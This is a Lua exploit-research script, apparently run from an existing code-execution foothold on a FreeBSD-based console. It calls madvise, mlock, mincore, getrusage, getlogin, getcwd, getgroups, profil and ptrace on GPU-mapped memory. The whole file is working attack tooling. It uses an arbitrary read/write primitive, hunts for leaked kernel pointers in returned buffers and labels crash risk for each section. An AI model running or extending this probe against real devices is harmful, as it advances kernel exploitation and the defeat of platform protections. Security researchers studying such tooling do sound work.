-- CRASH_CLASS: MODERATE
-- PROBE 110a: VM page manipulation on GPU mmap + standard info leaks
--
-- Context: madvise, mlock, munlock, mincore have NEVER been tested on
-- GPU-mapped pages. These FreeBSD VM syscalls manipulate per-page metadata
-- in the kernel. On device-backed (GPU) pages, the kernel's handling is
-- different from anonymous memory — potential for confused deputy attacks,
-- page fault handler bugs, and physical address leaks.
--
-- Also tests: getrusage (timing side channel), getlogin/getcwd (padding leaks),
-- profil (kernel PC sampling), and ptrace PT_TRACE_ME (via pcall).
--
-- Section A: madvise ops on GPU mmap (MADV_FREE/DONTNEED/etc.) (LOW risk)
-- Section B: mlock/munlock on GPU mmap (MODERATE risk)
-- Section C: mincore on GPU mmap — physical residency leak (LOW risk)
-- Section D: getrusage + getlogin + getcwd + fcntl (LOW risk)
-- Section E: profil kernel PC sampling + ptrace self-trace (MODERATE risk)

print("=== PROBE 110a: VM PAGE MANIPULATION + STANDARD INFO LEAKS ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function fmt_addr(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("%08X_%08X", h, l)
end
local function is_kptr(val)
    if val == nil then return false end
    local h, l = get_hi_lo(val)
    if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then return true end
    return false
end

local SYS_getpid    = 20
local SYS_ptrace    = 26
local SYS_profil    = 44
local SYS_getlogin  = 49
local SYS_madvise   = 75
local SYS_mincore   = 78
local SYS_getgroups = 79
local SYS_fcntl     = 92
local SYS_getrusage = 117
local SYS_mlock     = 203
local SYS_munlock   = 204
local SYS_mmap      = 477
local SYS_getcwd    = 326

local pid = to_num(make_syscall(SYS_getpid)())
print("pid: " .. pid)

-- Create GPU mmap region (our heap R/W primitive)
local PAGE_SIZE = 0x4000 -- 16KB
local NUM_PAGES = 32
local region_size = NUM_PAGES * PAGE_SIZE

local sc_mmap = make_syscall(SYS_mmap)
local ok_mmap, gpu_region = pcall(function()
    return sc_mmap(uint64(0), uint64(region_size), uint64(0x33),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
if ok_mmap then
    print("GPU mmap region: " .. fmt_addr(gpu_region) .. " size=0x" ..
          string.format("%X", region_size))
else
    print("GPU mmap FAILED")
    gpu_region = nil
end

-- Write sentinel pattern to GPU pages
if gpu_region then
    for p = 0, NUM_PAGES - 1 do
        local base = gpu_region + p * PAGE_SIZE
        for i = 0, 0x3F, 4 do
            safe_wd(base + i, 0xCAFE0000 + p)
        end
    end
    print("sentinel pattern written to " .. NUM_PAGES .. " pages")
end
print("")

-- ============================================================
-- SECTION A: madvise on GPU mmap
-- ============================================================
print("--- SECTION A: MADVISE ON GPU MMAP ---")
print("")

if gpu_region then
    local advices = {
        {0, "MADV_NORMAL"},
        {1, "MADV_RANDOM"},
        {2, "MADV_SEQUENTIAL"},
        {3, "MADV_WILLNEED"},
        {4, "MADV_DONTNEED"},
        {5, "MADV_FREE"},
        {6, "MADV_NOSYNC"},
        {7, "MADV_AUTOSYNC"},
        {8, "MADV_NOCORE"},
        {9, "MADV_CORE"},
        {10, "MADV_PROTECT"},
    }

    for _, adv in ipairs(advices) do
        local advice_val, advice_name = adv[1], adv[2]
        -- Use one page per advice to avoid cross-contamination
        local page_idx = advice_val % NUM_PAGES
        local page_addr = gpu_region + page_idx * PAGE_SIZE

        -- Read pre-madvise sentinel
        local pre_val = safe_rd(page_addr)

        local ok, rv = pcall(function()
            return to_num(make_syscall(SYS_madvise)(uint64(page_addr),
                uint64(PAGE_SIZE), uint64(advice_val)))
        end)

        local post_val = safe_rd(page_addr)
        local changed = (pre_val ~= post_val)

        local marker = ""
        if ok and to_num(rv) == 0 then marker = " *** ACCEPTED ***" end
        if changed then marker = marker .. " DATA_CHANGED" end

        print("[A] " .. advice_name .. "(" .. advice_val .. "): ok=" ..
              tostring(ok) .. " ret=" .. tostring(rv) ..
              " pre=0x" .. string.format("%X", pre_val or 0) ..
              " post=0x" .. string.format("%X", post_val or 0) .. marker)

        -- If MADV_FREE or MADV_DONTNEED accepted, check if page has new data
        if (advice_val == 4 or advice_val == 5) and ok and to_num(rv) == 0 then
            -- Touch page to trigger fault
            safe_wd(page_addr, 0xBEEF0000 + advice_val)
            local refault_val = safe_rd(page_addr)

            -- Scan entire page for kernel pointer remnants
            local kptrs = 0
            for i = 0, PAGE_SIZE - 8, 8 do
                local qv = safe_rq(page_addr + i)
                if is_kptr(qv) then
                    print("[A]   *** KPTR at page+" .. string.format("%04X", i) ..
                          ": " .. fmt_addr(qv) .. " ***")
                    kptrs = kptrs + 1
                end
            end
            print("[A]   post-fault scan: " .. kptrs .. " kernel ptrs")
        end
    end
else
    print("[A] SKIPPED — no GPU region")
end
print("")

-- ============================================================
-- SECTION B: mlock/munlock on GPU mmap
-- ============================================================
print("--- SECTION B: MLOCK/MUNLOCK GPU PAGES ---")
print("")

if gpu_region then
    -- Test mlock on first 4 pages
    local lock_size = 4 * PAGE_SIZE
    local ok_lock, rv_lock = pcall(function()
        return to_num(make_syscall(SYS_mlock)(uint64(gpu_region), uint64(lock_size)))
    end)
    print("[B] mlock: ok=" .. tostring(ok_lock) .. " ret=" .. tostring(rv_lock))

    if ok_lock and to_num(rv_lock) == 0 then
        print("[B] *** MLOCK SUCCEEDED ON GPU PAGES ***")

        -- Write test pattern
        for i = 0, 0x3F, 4 do
            safe_wd(gpu_region + i, 0xAAAA0000 + i)
        end

        -- munlock
        local ok_ul, rv_ul = pcall(function()
            return to_num(make_syscall(SYS_munlock)(uint64(gpu_region), uint64(lock_size)))
        end)
        print("[B] munlock: ok=" .. tostring(ok_ul) .. " ret=" .. tostring(rv_ul))

        -- Check if data changed after munlock
        local post_val = safe_rd(gpu_region)
        print("[B] post-munlock data[0]: 0x" .. string.format("%X", post_val or 0))

        -- Now do MADV_FREE + re-read (possible physical page reuse)
        pcall(function()
            make_syscall(SYS_madvise)(uint64(gpu_region), uint64(lock_size), uint64(5))
        end)

        -- Touch to trigger fault after MADV_FREE
        safe_wd(gpu_region, 0xDEAD)
        local after_free = safe_rd(gpu_region + 8)
        print("[B] post-MADV_FREE data[8]: 0x" .. string.format("%X", after_free or 0))

        -- Full page scan for kernel pointers
        local kptrs = 0
        for i = 0, lock_size - 8, 8 do
            local qv = safe_rq(gpu_region + i)
            if is_kptr(qv) then
                print("[B]   *** KPTR at +" .. string.format("%04X", i) .. ": " ..
                      fmt_addr(qv) .. " ***")
                kptrs = kptrs + 1
            end
        end
        print("[B] post-mlock-cycle kernel ptrs: " .. kptrs)
    end

    -- mlockall(324) — lock ALL pages
    local ok_all, rv_all = pcall(function()
        return to_num(make_syscall(324)(uint64(1))) -- MCL_CURRENT=1
    end)
    print("[B] mlockall(MCL_CURRENT): ok=" .. tostring(ok_all) .. " ret=" .. tostring(rv_all))
else
    print("[B] SKIPPED — no GPU region")
end
print("")

-- ============================================================
-- SECTION C: mincore on GPU mmap
-- ============================================================
print("--- SECTION C: MINCORE ON GPU MMAP ---")
print("")

if gpu_region then
    -- mincore returns one byte per page: bit 0 = resident
    local vec = memory.alloc(NUM_PAGES + 16)
    for i = 0, NUM_PAGES + 15 do
        pcall(function() memory.write_byte(vec + i, 0xFF) end) -- sentinel
    end

    local ok_mc, rv_mc = pcall(function()
        return to_num(make_syscall(SYS_mincore)(uint64(gpu_region),
            uint64(region_size), uint64(vec)))
    end)
    print("[C] mincore: ok=" .. tostring(ok_mc) .. " ret=" .. tostring(rv_mc))

    if ok_mc and to_num(rv_mc) == 0 then
        print("[C] *** MINCORE WORKS ON GPU PAGES ***")
        print("[C] residency vector (" .. NUM_PAGES .. " pages):")
        local resident_count = 0
        local vals = {}
        for i = 0, NUM_PAGES - 1 do
            local b = safe_rd(vec + (i - i % 4)) -- read dword containing byte
            if b ~= nil then
                local byte_val = math.floor(b / (256 ^ (i % 4))) % 256
                table.insert(vals, string.format("%02X", byte_val))
                if byte_val % 2 == 1 then resident_count = resident_count + 1 end
            end
        end
        print("[C] bytes: " .. table.concat(vals, " "))
        print("[C] resident pages: " .. resident_count .. "/" .. NUM_PAGES)

        -- Scan the vec buffer for extra data past expected output
        print("[C] vec buffer past expected:")
        for i = NUM_PAGES, NUM_PAGES + 15 do
            local b_dw = safe_rd(vec + (i - i % 4))
            if b_dw ~= nil then
                local byte_val = math.floor(b_dw / (256 ^ (i % 4))) % 256
                if byte_val ~= 0xFF then
                    print("[C]   vec[" .. i .. "] = 0x" .. string.format("%02X", byte_val) ..
                          " (non-sentinel)")
                end
            end
        end
    end
else
    print("[C] SKIPPED — no GPU region")
end
print("")

-- ============================================================
-- SECTION D: Standard info leak syscalls
-- ============================================================
print("--- SECTION D: STANDARD INFO LEAKS ---")
print("")

-- D1: getrusage(117) — full struct dump
print("[D] D1: getrusage")
repeat
    local buf = memory.alloc(0x100)
    for i = 0, 0xFF, 4 do safe_wd(buf + i, 0xDEADBEEF) end

    -- RUSAGE_SELF = 0
    local ok, rv = pcall(function()
        return to_num(make_syscall(SYS_getrusage)(uint64(0), uint64(buf)))
    end)
    print("[D] getrusage(SELF): ok=" .. tostring(ok) .. " ret=" .. tostring(rv))

    if ok and to_num(rv) == 0 then
        -- struct rusage is ~144 bytes on FreeBSD amd64
        local kptrs = 0
        for i = 0, 0x8F, 8 do
            local qv = safe_rq(buf + i)
            local h, l = get_hi_lo(qv)
            local m = ""
            if is_kptr(qv) then m = " *** KPTR ***"; kptrs = kptrs + 1 end
            if h == 0xDEADBEEF then m = " [sentinel]" end
            if m ~= "" or i < 0x20 then
                print("[D]   +" .. string.format("%02X", i) .. ": " .. fmt_addr(qv) .. m)
            end
        end
        print("[D] kernel ptrs in rusage: " .. kptrs)

        -- Timing values (for side channel calibration)
        local utime_sec = safe_rd(buf)
        local utime_usec = safe_rd(buf + 8)
        local stime_sec = safe_rd(buf + 0x10)
        local stime_usec = safe_rd(buf + 0x18)
        print("[D] user time: " .. tostring(utime_sec) .. "s " ..
              tostring(utime_usec) .. "us")
        print("[D] sys time: " .. tostring(stime_sec) .. "s " ..
              tostring(stime_usec) .. "us")
    end

    -- RUSAGE_CHILDREN = -1
    for i = 0, 0xFF, 4 do safe_wd(buf + i, 0xDEADBEEF) end
    local ok2, rv2 = pcall(function()
        return to_num(make_syscall(SYS_getrusage)(uint64(0xFFFFFFFF), uint64(buf)))
    end)
    print("[D] getrusage(CHILDREN): ret=" .. tostring(rv2))

    -- RUSAGE_THREAD = 1
    for i = 0, 0xFF, 4 do safe_wd(buf + i, 0xDEADBEEF) end
    local ok3, rv3 = pcall(function()
        return to_num(make_syscall(SYS_getrusage)(uint64(1), uint64(buf)))
    end)
    print("[D] getrusage(THREAD): ret=" .. tostring(rv3))
until true
print("")

-- D2: getlogin(49)
print("[D] D2: getlogin")
repeat
    local buf = memory.alloc(0x100)
    for i = 0, 0xFF, 4 do safe_wd(buf + i, 0xDEADBEEF) end

    local ok, rv = pcall(function()
        return to_num(make_syscall(SYS_getlogin)(uint64(buf), uint64(0x100)))
    end)
    print("[D] getlogin: ok=" .. tostring(ok) .. " ret=" .. tostring(rv))

    if ok and to_num(rv) == 0 then
        -- Read string
        local name = ""
        for i = 0, 63 do
            local dw = safe_rd(buf + (i - i % 4))
            if dw then
                local byte = math.floor(dw / (256 ^ (i % 4))) % 256
                if byte == 0 then break end
                name = name .. string.char(byte)
            end
        end
        print("[D] login name: '" .. name .. "'")

        -- Scan PAST the null terminator for kernel heap leaks
        local name_end = #name + 1
        local kptrs = 0
        for i = name_end, 0xFF, 8 do
            local aligned = i - (i % 8)
            local qv = safe_rq(buf + aligned)
            if qv and not is_kptr(qv) then
                -- skip
            elseif is_kptr(qv) then
                print("[D]   post-null +" .. string.format("%02X", aligned) ..
                      ": " .. fmt_addr(qv) .. " *** KPTR ***")
                kptrs = kptrs + 1
            end
        end
        print("[D] post-null kernel ptrs: " .. kptrs)
    end
until true
print("")

-- D3: __getcwd(326)
print("[D] D3: getcwd")
repeat
    local buf = memory.alloc(0x200)
    for i = 0, 0x1FF, 4 do safe_wd(buf + i, 0xDEADBEEF) end

    local ok, rv = pcall(function()
        return to_num(make_syscall(SYS_getcwd)(uint64(buf), uint64(0x200)))
    end)
    print("[D] __getcwd: ok=" .. tostring(ok) .. " ret=" .. tostring(rv))

    if ok and to_num(rv) == 0 then
        -- Read path string
        local path = ""
        for i = 0, 255 do
            local dw = safe_rd(buf + (i - i % 4))
            if dw then
                local byte = math.floor(dw / (256 ^ (i % 4))) % 256
                if byte == 0 then break end
                path = path .. string.char(byte)
            end
        end
        print("[D] cwd: '" .. path .. "'")
    end
until true
print("")

-- D4: getgroups(79)
print("[D] D4: getgroups")
repeat
    local buf = memory.alloc(0x100)
    for i = 0, 0xFF, 4 do safe_wd(buf + i, 0xDEADBEEF) end

    local ok, rv = pcall(function()
        return to_num(make_syscall(SYS_getgroups)(uint64(32), uint64(buf)))
    end)
    print("[D] getgroups(32): ok=" .. tostring(ok) .. " ret=" .. tostring(rv))

    if ok and to_num(rv) >= 0 then
        local ngroups = to_num(rv)
        print("[D] ngroups: " .. ngroups)
        local groups = {}
        for i = 0, math.min(ngroups, 32) - 1 do
            local gid = safe_rd(buf + i * 4)
            table.insert(groups, tostring(gid))
        end
        if #groups > 0 then print("[D] groups: " .. table.concat(groups, ",")) end

        -- Scan past returned groups for kernel heap leak
        for i = ngroups * 4, 0xFF, 8 do
            local qv = safe_rq(buf + i)
            if is_kptr(qv) then
                print("[D]   post-groups +" .. string.format("%02X", i) ..
                      ": " .. fmt_addr(qv) .. " *** KPTR ***")
            end
        end
    end
until true
print("")

-- ============================================================
-- SECTION E: profil + ptrace (MODERATE risk)
-- ============================================================
print("--- SECTION E: PROFIL + PTRACE ---")
print("")

-- E1: profil(44) — kernel PC sampling
print("[E] E1: profil setup")
repeat
    -- profil(samples, size, offset, scale)
    -- samples: buffer for PC samples (uint16_t array)
    -- size: buffer size
    -- offset: lowest PC address to sample
    -- scale: sampling frequency (0x10000 = 1:1, 0x8000 = 1:2)
    local samples = memory.alloc(0x1000)
    for i = 0, 0xFFF, 4 do safe_wd(samples + i, 0) end

    -- Get eboot base for offset
    local info_buf = memory.alloc(0x200)
    safe_wd(info_buf, 0x160)
    pcall(function() make_syscall(593)(uint64(0), uint64(info_buf)) end)
    local eboot_lo = safe_rd(info_buf + 0x108)
    local eboot_hi = safe_rd(info_buf + 0x10C)
    local eboot_base = uint64(string.format("0x%X%08X", eboot_hi or 0, eboot_lo or 0))
    print("[E] eboot base: " .. fmt_addr(eboot_base))

    local ok, rv = pcall(function()
        return to_num(make_syscall(SYS_profil)(uint64(samples), uint64(0x1000),
            uint64(eboot_base), uint64(0x10000)))
    end)
    print("[E] profil: ok=" .. tostring(ok) .. " ret=" .. tostring(rv))

    if ok and to_num(rv) == 0 then
        print("[E] *** PROFIL ACCEPTED ***")

        -- Do some work to generate samples
        local dummy = 0
        for i = 1, 10000 do dummy = dummy + i end

        -- Read samples
        local nonzero = 0
        for i = 0, 0xFFF, 4 do
            local val = safe_rd(samples + i)
            if val ~= nil and val ~= 0 then
                nonzero = nonzero + 1
                if nonzero <= 10 then
                    print("[E]   sample[" .. string.format("%03X", i) .. "]: " .. val)
                end
            end
        end
        print("[E] nonzero samples: " .. nonzero)

        -- Disable profil
        pcall(function()
            make_syscall(SYS_profil)(uint64(0), uint64(0), uint64(0), uint64(0))
        end)
    end
until true
print("")

-- E2: ptrace(26) — self-trace (pcall-protected)
print("[E] E2: ptrace self-trace (pcall-protected)")
repeat
    -- PT_TRACE_ME = 0
    local ok1, rv1 = pcall(function()
        return to_num(make_syscall(SYS_ptrace)(uint64(0), uint64(0), uint64(0), uint64(0)))
    end)
    print("[E] PT_TRACE_ME: ok=" .. tostring(ok1) .. " ret=" .. tostring(rv1))

    if not ok1 then
        print("[E] ptrace(PT_TRACE_ME) threw exception — blocked or crashes")
        break
    end

    if to_num(rv1) == 0 then
        print("[E] *** PT_TRACE_ME SUCCEEDED ***")
    end

    -- PT_LWPINFO = 13 (FreeBSD) — get LWP info for self
    -- struct ptrace_lwpinfo has pl_lwpid, pl_event, pl_flags, pl_sigmask, etc.
    local lwpinfo = memory.alloc(0x100)
    for i = 0, 0xFF, 4 do safe_wd(lwpinfo + i, 0xDEADBEEF) end

    local ok2, rv2 = pcall(function()
        return to_num(make_syscall(SYS_ptrace)(uint64(13), uint64(pid),
            uint64(lwpinfo), uint64(0x100)))
    end)
    print("[E] PT_LWPINFO: ok=" .. tostring(ok2) .. " ret=" .. tostring(rv2))

    if ok2 and to_num(rv2) == 0 then
        print("[E] lwpinfo dump:")
        for i = 0, 0x7F, 8 do
            local qv = safe_rq(lwpinfo + i)
            local h, l = get_hi_lo(qv)
            local m = ""
            if is_kptr(qv) then m = " *** KPTR ***" end
            if h ~= 0xDEADBEEF then
                print("[E]   +" .. string.format("%02X", i) .. ": " .. fmt_addr(qv) .. m)
            end
        end
    end

    -- PT_GETNUMLWPS = 14
    local ok3, rv3 = pcall(function()
        return to_num(make_syscall(SYS_ptrace)(uint64(14), uint64(pid), uint64(0), uint64(0)))
    end)
    print("[E] PT_GETNUMLWPS: ok=" .. tostring(ok3) .. " ret=" .. tostring(rv3))
until true

print("")
print("=== PROBE 110a COMPLETE ===")
